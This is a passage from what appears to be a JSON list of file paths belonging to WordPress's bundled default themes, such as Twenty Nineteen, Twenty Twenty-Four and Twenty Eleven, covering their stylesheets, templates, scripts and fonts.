    "wp-content/themes/twentynineteen/sass/navigation/_next-previous.scss",
    "wp-content/themes/twentynineteen/sass/navigation/_links.scss",
    "wp-content/themes/twentynineteen/sass/navigation/_menu-main-navigation.scss",
    "wp-content/themes/twentynineteen/sass/navigation/_menu-social-navigation.scss",
    "wp-content/themes/twentynineteen/sass/variables-site/_colors.scss",
    "wp-content/themes/twentynineteen/sass/variables-site/_columns.scss",
    "wp-content/themes/twentynineteen/sass/variables-site/_structure.scss",
    "wp-content/themes/twentynineteen/sass/variables-site/_variables-site.scss",
    "wp-content/themes/twentynineteen/sass/variables-site/_transitions.scss",
    "wp-content/themes/twentynineteen/sass/variables-site/_fonts.scss",
    "wp-content/themes/twentynineteen/sass/modules/_accessibility.scss",
    "wp-content/themes/twentynineteen/sass/modules/_alignments.scss",
    "wp-content/themes/twentynineteen/sass/modules/_clearings.scss",
    "wp-content/themes/twentynineteen/sass/forms/_fields.scss",
    "wp-content/themes/twentynineteen/sass/forms/_buttons.scss",
    "wp-content/themes/twentynineteen/sass/forms/_forms.scss",
    "wp-content/themes/twentynineteen/sass/_normalize.scss",
    "wp-content/themes/twentynineteen/sass/elements/_tables.scss",
    "wp-content/themes/twentynineteen/sass/elements/_elements.scss",
    "wp-content/themes/twentynineteen/sass/elements/_lists.scss",
    "wp-content/themes/twentynineteen/fonts/NonBreakingSpaceOverride.woff2",
    "wp-content/themes/twentynineteen/fonts/NonBreakingSpaceOverride.woff",
    "wp-content/themes/twentynineteen/search.php",
    "wp-content/themes/twentynineteen/classes/class-twentynineteen-svg-icons.php",
    "wp-content/themes/twentynineteen/classes/class-twentynineteen-walker-comment.php",
    "wp-content/themes/twentynineteen/style.scss",
    "wp-content/themes/twentynineteen/index.php",
    "wp-content/themes/twentynineteen/image.php",
    "wp-content/themes/twentynineteen/print.scss",
    "wp-content/themes/twentynineteen/postcss.config.js",
    "wp-content/themes/twentynineteen/contributing.txt",
    "wp-content/themes/twentytwentyfour/readme.txt",
    "wp-content/themes/twentytwentyfour/assets/images/museum.webp",
    "wp-content/themes/twentytwentyfour/assets/images/abstract-geometric-art.webp",
    "wp-content/themes/twentytwentyfour/assets/images/green-staircase.webp",
    "wp-content/themes/twentytwentyfour/assets/images/tourist-and-building.webp",
    "wp-content/themes/twentytwentyfour/assets/images/windows.webp",
    "wp-content/themes/twentytwentyfour/assets/images/art-gallery.webp",
    "wp-content/themes/twentytwentyfour/assets/images/building-exterior.webp",
    "wp-content/themes/twentytwentyfour/assets/images/icon-message.webp",
    "wp-content/themes/twentytwentyfour/assets/images/hotel-facade.webp",
    "wp-content/themes/twentytwentyfour/assets/images/angular-roof.webp",
    "wp-content/themes/twentytwentyfour/assets/fonts/jost/Jost-Italic-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfour/assets/fonts/jost/Jost-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfour/assets/fonts/jost/OFL.txt",
    "wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_italic_400.woff2",
    "wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_normal_700.woff2",
    "wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_normal_400.woff2",
    "wp-content/themes/twentytwentyfour/assets/fonts/cardo/LICENSE.txt",
    "wp-content/themes/twentytwentyfour/assets/fonts/inter/Inter-VariableFont_slnt,wght.woff2",
    "wp-content/themes/twentytwentyfour/assets/fonts/inter/LICENSE.txt",
    "wp-content/themes/twentytwentyfour/assets/fonts/instrument-sans/InstrumentSans-VariableFont_wdth,wght.woff2",
    "wp-content/themes/twentytwentyfour/assets/fonts/instrument-sans/OFL.txt",
    "wp-content/themes/twentytwentyfour/assets/fonts/instrument-sans/InstrumentSans-Italic-VariableFont_wdth,wght.woff2",
    "wp-content/themes/twentytwentyfour/patterns/text-feature-grid-3-col.php",
    "wp-content/themes/twentytwentyfour/patterns/posts-3-col.php",
    "wp-content/themes/twentytwentyfour/patterns/template-home-portfolio.php",
    "wp-content/themes/twentytwentyfour/patterns/posts-images-only-3-col.php",
    "wp-content/themes/twentytwentyfour/patterns/footer-centered-logo-nav.php",
    "wp-content/themes/twentytwentyfour/patterns/posts-1-col.php",
    "wp-content/themes/twentytwentyfour/patterns/template-single-portfolio.php",
    "wp-content/themes/twentytwentyfour/patterns/hidden-post-navigation.php",
    "wp-content/themes/twentytwentyfour/patterns/page-home-portfolio-gallery.php",
    "wp-content/themes/twentytwentyfour/patterns/text-project-details.php",
    "wp-content/themes/twentytwentyfour/patterns/template-archive-portfolio.php",
    "wp-content/themes/twentytwentyfour/patterns/footer.php",
    "wp-content/themes/twentytwentyfour/patterns/page-about-business.php",
    "wp-content/themes/twentytwentyfour/patterns/template-home-business.php",
    "wp-content/themes/twentytwentyfour/patterns/template-search-blogging.php",
    "wp-content/themes/twentytwentyfour/patterns/posts-grid-2-col.php",
    "wp-content/themes/twentytwentyfour/patterns/banner-hero.php",
    "wp-content/themes/twentytwentyfour/patterns/gallery-project-layout.php",
    "wp-content/themes/twentytwentyfour/patterns/banner-project-description.php",
    "wp-content/themes/twentytwentyfour/patterns/page-home-portfolio.php",
    "wp-content/themes/twentytwentyfour/patterns/template-index-portfolio.php",
    "wp-content/themes/twentytwentyfour/patterns/gallery-full-screen-image.php",
    "wp-content/themes/twentytwentyfour/patterns/page-portfolio-overview.php",
    "wp-content/themes/twentytwentyfour/patterns/posts-images-only-offset-4-col.php",
    "wp-content/themes/twentytwentyfour/patterns/cta-services-image-left.php",
    "wp-content/themes/twentytwentyfour/patterns/gallery-offset-images-grid-2-col.php",
    "wp-content/themes/twentytwentyfour/patterns/template-search-portfolio.php",
    "wp-content/themes/twentytwentyfour/patterns/page-newsletter-landing.php",
    "wp-content/themes/twentytwentyfour/patterns/text-alternating-images.php",
    "wp-content/themes/twentytwentyfour/patterns/cta-subscribe-centered.php",
    "wp-content/themes/twentytwentyfour/patterns/gallery-offset-images-grid-4-col.php",
    "wp-content/themes/twentytwentyfour/patterns/cta-content-image-on-right.php",
    "wp-content/themes/twentytwentyfour/patterns/posts-list.php",
    "wp-content/themes/twentytwentyfour/patterns/text-centered-statement-small.php",
    "wp-content/themes/twentytwentyfour/patterns/hidden-sidebar.php",
    "wp-content/themes/twentytwentyfour/patterns/hidden-post-meta.php",
    "wp-content/themes/twentytwentyfour/patterns/hidden-comments.php",
    "wp-content/themes/twentytwentyfour/patterns/hidden-404.php",
    "wp-content/themes/twentytwentyfour/patterns/page-rsvp-landing.php",
    "wp-content/themes/twentytwentyfour/patterns/hidden-search.php",
    "wp-content/themes/twentytwentyfour/patterns/page-home-blogging.php",
    "wp-content/themes/twentytwentyfour/patterns/team-4-col.php",
    "wp-content/themes/twentytwentyfour/patterns/hidden-no-results.php",
    "wp-content/themes/twentytwentyfour/patterns/hidden-posts-heading.php",
    "wp-content/themes/twentytwentyfour/patterns/hidden-portfolio-hero.php",
    "wp-content/themes/twentytwentyfour/patterns/testimonial-centered.php",
    "wp-content/themes/twentytwentyfour/patterns/template-home-blogging.php",
    "wp-content/themes/twentytwentyfour/patterns/cta-pricing.php",
    "wp-content/themes/twentytwentyfour/patterns/gallery-offset-images-grid-3-col.php",
    "wp-content/themes/twentytwentyfour/patterns/footer-colophon-3-col.php",
    "wp-content/themes/twentytwentyfour/patterns/template-archive-blogging.php",
    "wp-content/themes/twentytwentyfour/patterns/template-index-blogging.php",
    "wp-content/themes/twentytwentyfour/patterns/text-centered-statement.php",
    "wp-content/themes/twentytwentyfour/patterns/text-faq.php",
    "wp-content/themes/twentytwentyfour/patterns/text-title-left-image-right.php",
    "wp-content/themes/twentytwentyfour/patterns/page-home-business.php",
    "wp-content/themes/twentytwentyfour/patterns/cta-rsvp.php",
    "wp-content/themes/twentytwentyfour/parts/sidebar.html",
    "wp-content/themes/twentytwentyfour/parts/header.html",
    "wp-content/themes/twentytwentyfour/parts/footer.html",
    "wp-content/themes/twentytwentyfour/parts/post-meta.html",
    "wp-content/themes/twentytwentyfour/styles/fossil.json",
    "wp-content/themes/twentytwentyfour/styles/maelstrom.json",
    "wp-content/themes/twentytwentyfour/styles/onyx.json",
    "wp-content/themes/twentytwentyfour/styles/ember.json",
    "wp-content/themes/twentytwentyfour/styles/ice.json",
    "wp-content/themes/twentytwentyfour/styles/mint.json",
    "wp-content/themes/twentytwentyfour/styles/rust.json",
    "wp-content/themes/twentytwentyfour/functions.php",
    "wp-content/themes/twentytwentyfour/theme.json",
    "wp-content/themes/twentytwentyfour/templates/page-with-sidebar.html",
    "wp-content/themes/twentytwentyfour/templates/page.html",
    "wp-content/themes/twentytwentyfour/templates/single-with-sidebar.html",
    "wp-content/themes/twentytwentyfour/templates/home.html",
    "wp-content/themes/twentytwentyfour/templates/page-wide.html",
    "wp-content/themes/twentytwentyfour/templates/search.html",
    "wp-content/themes/twentytwentyfour/templates/single.html",
    "wp-content/themes/twentytwentyfour/templates/index.html",
    "wp-content/themes/twentytwentyfour/templates/archive.html",
    "wp-content/themes/twentytwentyfour/templates/404.html",
    "wp-content/themes/twentytwentyfour/templates/page-no-title.html",
    "wp-content/themes/twentytwentythree/readme.txt",
    "wp-content/themes/twentytwentythree/assets/fonts/source-serif-pro/SourceSerif4Variable-Roman.ttf.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/source-serif-pro/SourceSerif4Variable-Italic.otf.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/source-serif-pro/LICENSE.md",
    "wp-content/themes/twentytwentythree/assets/fonts/source-serif-pro/SourceSerif4Variable-Roman.otf.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/source-serif-pro/SourceSerif4Variable-Italic.ttf.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/dm-sans/DMSans-Regular-Italic.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/dm-sans/DMSans-Bold-Italic.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/dm-sans/DMSans-Regular.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/dm-sans/LICENSE.txt",
    "wp-content/themes/twentytwentythree/assets/fonts/dm-sans/DMSans-Bold.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/ibm-plex-mono/IBMPlexMono-Light.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/ibm-plex-mono/OFL.txt",
    "wp-content/themes/twentytwentythree/assets/fonts/ibm-plex-mono/IBMPlexMono-Italic.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/ibm-plex-mono/IBMPlexMono-Bold.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/ibm-plex-mono/IBMPlexMono-Regular.woff2",
    "wp-content/themes/twentytwentythree/assets/fonts/inter/Inter-VariableFont_slnt,wght.ttf",
    "wp-content/themes/twentytwentythree/assets/fonts/inter/LICENSE.txt",
    "wp-content/themes/twentytwentythree/patterns/footer-default.php",
    "wp-content/themes/twentytwentythree/patterns/hidden-heading.php",
    "wp-content/themes/twentytwentythree/patterns/call-to-action.php",
    "wp-content/themes/twentytwentythree/patterns/hidden-comments.php",
    "wp-content/themes/twentytwentythree/patterns/hidden-404.php",
    "wp-content/themes/twentytwentythree/patterns/post-meta.php",
    "wp-content/themes/twentytwentythree/patterns/hidden-no-results.php",
    "wp-content/themes/twentytwentythree/parts/header.html",
    "wp-content/themes/twentytwentythree/parts/footer.html",
    "wp-content/themes/twentytwentythree/parts/post-meta.html",
    "wp-content/themes/twentytwentythree/parts/comments.html",
    "wp-content/themes/twentytwentythree/styles/pitch.json",
    "wp-content/themes/twentytwentythree/styles/grapes.json",
    "wp-content/themes/twentytwentythree/styles/marigold.json",
    "wp-content/themes/twentytwentythree/styles/block-out.json",
    "wp-content/themes/twentytwentythree/styles/pilgrimage.json",
    "wp-content/themes/twentytwentythree/styles/aubergine.json",
    "wp-content/themes/twentytwentythree/styles/canary.json",
    "wp-content/themes/twentytwentythree/styles/sherbet.json",
    "wp-content/themes/twentytwentythree/styles/electric.json",
    "wp-content/themes/twentytwentythree/styles/whisper.json",
    "wp-content/themes/twentytwentythree/theme.json",
    "wp-content/themes/twentytwentythree/templates/page.html",
    "wp-content/themes/twentytwentythree/templates/blank.html",
    "wp-content/themes/twentytwentythree/templates/home.html",
    "wp-content/themes/twentytwentythree/templates/blog-alternative.html",
    "wp-content/themes/twentytwentythree/templates/search.html",
    "wp-content/themes/twentytwentythree/templates/single.html",
    "wp-content/themes/twentytwentythree/templates/index.html",
    "wp-content/themes/twentytwentythree/templates/archive.html",
    "wp-content/themes/twentytwentythree/templates/404.html",
    "wp-content/themes/twentyfourteen/comments.php",
    "wp-content/themes/twentyfourteen/readme.txt",
    "wp-content/themes/twentyfourteen/content-link.php",
    "wp-content/themes/twentyfourteen/content-audio.php",
    "wp-content/themes/twentyfourteen/footer.php",
    "wp-content/themes/twentyfourteen/404.php",
    "wp-content/themes/twentyfourteen/archive.php",
    "wp-content/themes/twentyfourteen/content-image.php",
    "wp-content/themes/twentyfourteen/author.php",
    "wp-content/themes/twentyfourteen/page.php",
    "wp-content/themes/twentyfourteen/images/pattern-light.svg",
    "wp-content/themes/twentyfourteen/images/pattern-dark.svg",
    "wp-content/themes/twentyfourteen/page-templates/contributors.php",
    "wp-content/themes/twentyfourteen/page-templates/full-width.php",
    "wp-content/themes/twentyfourteen/content-quote.php",
    "wp-content/themes/twentyfourteen/content-aside.php",
    "wp-content/themes/twentyfourteen/sidebar-content.php",
    "wp-content/themes/twentyfourteen/functions.php",
    "wp-content/themes/twentyfourteen/js/featured-content-admin.js",
    "wp-content/themes/twentyfourteen/js/customizer.js",
    "wp-content/themes/twentyfourteen/js/slider.js",
    "wp-content/themes/twentyfourteen/js/functions.js",
    "wp-content/themes/twentyfourteen/js/keyboard-image-navigation.js",
    "wp-content/themes/twentyfourteen/js/html5.js",
    "wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.eot",
    "wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.ttf",
    "wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.svg",
    "wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.woff",
    "wp-content/themes/twentyfourteen/genericons/Genericons-Regular.otf",
    "wp-content/themes/twentyfourteen/genericons/README.txt",
    "wp-content/themes/twentyfourteen/genericons/COPYING.txt",
    "wp-content/themes/twentyfourteen/genericons/LICENSE.txt",
    "wp-content/themes/twentyfourteen/content-video.php",
    "wp-content/themes/twentyfourteen/header.php",
    "wp-content/themes/twentyfourteen/sidebar-footer.php",
    "wp-content/themes/twentyfourteen/featured-content.php",
    "wp-content/themes/twentyfourteen/content.php",
    "wp-content/themes/twentyfourteen/single.php",
    "wp-content/themes/twentyfourteen/sidebar.php",
    "wp-content/themes/twentyfourteen/content-none.php",
    "wp-content/themes/twentyfourteen/inc/customizer.php",
    "wp-content/themes/twentyfourteen/inc/custom-header.php",
    "wp-content/themes/twentyfourteen/inc/widgets.php",
    "wp-content/themes/twentyfourteen/inc/template-tags.php",
    "wp-content/themes/twentyfourteen/inc/featured-content.php",
    "wp-content/themes/twentyfourteen/inc/back-compat.php",
    "wp-content/themes/twentyfourteen/inc/block-patterns.php",
    "wp-content/themes/twentyfourteen/tag.php",
    "wp-content/themes/twentyfourteen/taxonomy-post_format.php",
    "wp-content/themes/twentyfourteen/content-gallery.php",
    "wp-content/themes/twentyfourteen/content-page.php",
    "wp-content/themes/twentyfourteen/category.php",
    "wp-content/themes/twentyfourteen/content-featured-post.php",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-all-300-italic.woff",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-400-italic.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-ext-700-italic.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-ext-400-normal.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-ext-700-normal.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-ext-900-normal.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-ext-400-italic.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-all-900-normal.woff",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-all-300-normal.woff",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-300-italic.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-all-700-italic.woff",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-300-normal.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-400-normal.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-ext-300-normal.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-all-400-normal.woff",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-900-normal.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-all-400-italic.woff",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-700-italic.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-700-normal.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-latin-ext-300-italic.woff2",
    "wp-content/themes/twentyfourteen/fonts/lato/LICENSE.txt",
    "wp-content/themes/twentyfourteen/fonts/lato/lato-all-700-normal.woff",
    "wp-content/themes/twentyfourteen/search.php",
    "wp-content/themes/twentyfourteen/index.php",
    "wp-content/themes/twentyfourteen/image.php",
    "wp-content/themes/twentyeleven/showcase.php",
    "wp-content/themes/twentyeleven/comments.php",
    "wp-content/themes/twentyeleven/readme.txt",
    "wp-content/themes/twentyeleven/content-link.php",
    "wp-content/themes/twentyeleven/content-single.php",
    "wp-content/themes/twentyeleven/footer.php",
    "wp-content/themes/twentyeleven/content-status.php",
    "wp-content/themes/twentyeleven/404.php",
    "wp-content/themes/twentyeleven/archive.php",
    "wp-content/themes/twentyeleven/content-image.php",
    "wp-content/themes/twentyeleven/author.php",
    "wp-content/themes/twentyeleven/page.php",
    "wp-content/themes/twentyeleven/content-quote.php",
    "wp-content/themes/twentyeleven/content-aside.php",
    "wp-content/themes/twentyeleven/functions.php",
    "wp-content/themes/twentyeleven/js/showcase.js",
    "wp-content/themes/twentyeleven/js/html5.js",
    "wp-content/themes/twentyeleven/header.php",
    "wp-content/themes/twentyeleven/content-intro.php",
    "wp-content/themes/twentyeleven/license.txt",
    "wp-content/themes/twentyeleven/sidebar-footer.php",
    "wp-content/themes/twentyeleven/content.php",
    "wp-content/themes/twentyeleven/single.php",
    "wp-content/themes/twentyeleven/sidebar.php",
    "wp-content/themes/twentyeleven/inc/widgets.php",
    "wp-content/themes/twentyeleven/inc/theme-options.php",
    "wp-content/themes/twentyeleven/inc/theme-options.js",
    "wp-content/themes/twentyeleven/inc/theme-customizer.js",
    "wp-content/themes/twentyeleven/inc/block-patterns.php",
    "wp-content/themes/twentyeleven/tag.php",
    "wp-content/themes/twentyeleven/content-gallery.php",
    "wp-content/themes/twentyeleven/sidebar-page.php",
    "wp-content/themes/twentyeleven/content-page.php",
    "wp-content/themes/twentyeleven/category.php",
    "wp-content/themes/twentyeleven/content-featured.php",
    "wp-content/themes/twentyeleven/languages/twentyeleven.pot",
    "wp-content/themes/twentyeleven/search.php",
    "wp-content/themes/twentyeleven/searchform.php",
    "wp-content/themes/twentyeleven/index.php",
    "wp-content/themes/twentyeleven/image.php",
    "wp-content/themes/index.php",
    "wp-content/themes/twentytwentyone/comments.php",
    "wp-content/themes/twentytwentyone/readme.txt",
    "wp-content/themes/twentytwentyone/template-parts/footer/footer-widgets.php",
    "wp-content/themes/twentytwentyone/template-parts/header/site-header.php",
    "wp-content/themes/twentytwentyone/template-parts/header/site-branding.php",
    "wp-content/themes/twentytwentyone/template-parts/header/entry-header.php",
    "wp-content/themes/twentytwentyone/template-parts/header/excerpt-header.php",
    "wp-content/themes/twentytwentyone/template-parts/header/site-nav.php",
    "wp-content/themes/twentytwentyone/template-parts/excerpt/excerpt-gallery.php",
    "wp-content/themes/twentytwentyone/template-parts/excerpt/excerpt-video.php",
    "wp-content/themes/twentytwentyone/template-parts/excerpt/excerpt.php",
    "wp-content/themes/twentytwentyone/template-parts/excerpt/excerpt-quote.php",
    "wp-content/themes/twentytwentyone/template-parts/excerpt/excerpt-status.php",
    "wp-content/themes/twentytwentyone/template-parts/excerpt/excerpt-audio.php",
    "wp-content/themes/twentytwentyone/template-parts/excerpt/excerpt-chat.php",
    "wp-content/themes/twentytwentyone/template-parts/excerpt/excerpt-image.php",
    "wp-content/themes/twentytwentyone/template-parts/excerpt/excerpt-link.php",
    "wp-content/themes/twentytwentyone/template-parts/excerpt/excerpt-aside.php",
    "wp-content/themes/twentytwentyone/template-parts/content/content-single.php",
    "wp-content/themes/twentytwentyone/template-parts/content/content.php",
    "wp-content/themes/twentytwentyone/template-parts/content/content-none.php",
    "wp-content/themes/twentytwentyone/template-parts/content/content-page.php",
    "wp-content/themes/twentytwentyone/template-parts/content/content-excerpt.php",
    "wp-content/themes/twentytwentyone/template-parts/post/author-bio.php",
    "wp-content/themes/twentytwentyone/.npmrc",
    "wp-content/themes/twentytwentyone/assets/js/editor.js",
    "wp-content/themes/twentytwentyone/assets/js/skip-link-focus-fix.js",
    "wp-content/themes/twentytwentyone/assets/js/customize-helpers.js",
    "wp-content/themes/twentytwentyone/assets/js/responsive-embeds.js",
    "wp-content/themes/twentytwentyone/assets/js/primary-navigation.js",
    "wp-content/themes/twentytwentyone/assets/js/editor-dark-mode-support.js",
    "wp-content/themes/twentytwentyone/assets/js/customize.js",
    "wp-content/themes/twentytwentyone/assets/js/polyfills.js",
    "wp-content/themes/twentytwentyone/assets/js/palette-colorpicker.js",
    "wp-content/themes/twentytwentyone/assets/js/customize-preview.js",
    "wp-content/themes/twentytwentyone/assets/js/dark-mode-toggler.js",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/footer-navigation.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/header.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/navigation.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/entry.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/widgets.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/comments.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/pagination.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/search.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/single.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/404.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/posts-and-pages.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/archives.scss",
    "wp-content/themes/twentytwentyone/assets/sass/06-components/footer.scss",
    "wp-content/themes/twentytwentyone/assets/sass/07-utilities/measure.scss",
    "wp-content/themes/twentytwentyone/assets/sass/07-utilities/color-palette.scss",
    "wp-content/themes/twentytwentyone/assets/sass/07-utilities/ie.scss",
    "wp-content/themes/twentytwentyone/assets/sass/07-utilities/print.scss",
    "wp-content/themes/twentytwentyone/assets/sass/07-utilities/a11y.scss",
    "wp-content/themes/twentytwentyone/assets/sass/style-editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/01-settings/global.scss",
    "wp-content/themes/twentytwentyone/assets/sass/01-settings/fonts.scss",
    "wp-content/themes/twentytwentyone/assets/sass/01-settings/file-header.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/heading/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/heading/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/cover/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/cover/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-comments/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-comments/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/blocks-editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/legacy/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/legacy/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/pullquote/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/pullquote/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/media-text/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/media-text/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/video/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/columns/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/columns/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/search/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/search/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/query-loop/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/query-loop/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/group/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/group/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/code/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/code/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/paragraph/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/paragraph/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/preformatted/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/preformatted/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/file/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/file/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/table/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/table/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/image/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/image/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/html/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/button/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/button/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/gallery/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/gallery/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/audio/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/navigation/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/navigation/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/utilities/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/utilities/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/utilities/_font-sizes.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/list/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/list/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/blocks.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/quote/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/quote/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-posts/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-posts/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/_config.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/rss/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/rss/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/separator/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/separator/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/verse/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/verse/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/tag-clould/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/tag-clould/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/social-icons/_editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/05-blocks/social-icons/_style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/03-generic/breakpoints.scss",
    "wp-content/themes/twentytwentyone/assets/sass/03-generic/clearings.scss",
    "wp-content/themes/twentytwentyone/assets/sass/03-generic/vertical-margins.scss",
    "wp-content/themes/twentytwentyone/assets/sass/03-generic/reset.scss",
    "wp-content/themes/twentytwentyone/assets/sass/03-generic/normalize.scss",
    "wp-content/themes/twentytwentyone/assets/sass/style.scss",
    "wp-content/themes/twentytwentyone/assets/sass/02-tools/functions.scss",
    "wp-content/themes/twentytwentyone/assets/sass/02-tools/mixins.scss",
    "wp-content/themes/twentytwentyone/assets/sass/style-dark-mode.scss",
    "wp-content/themes/twentytwentyone/assets/sass/04-elements/forms.scss",
    "wp-content/themes/twentytwentyone/assets/sass/04-elements/media.scss",
    "wp-content/themes/twentytwentyone/assets/sass/04-elements/forms-editor.scss",
    "wp-content/themes/twentytwentyone/assets/sass/04-elements/blockquote.scss",
    "wp-content/themes/twentytwentyone/assets/sass/04-elements/links.scss",
    "wp-content/themes/twentytwentyone/assets/sass/04-elements/misc.scss",
    "wp-content/themes/twentytwentyone/footer.php",
    "wp-content/themes/twentytwentyone/404.php",
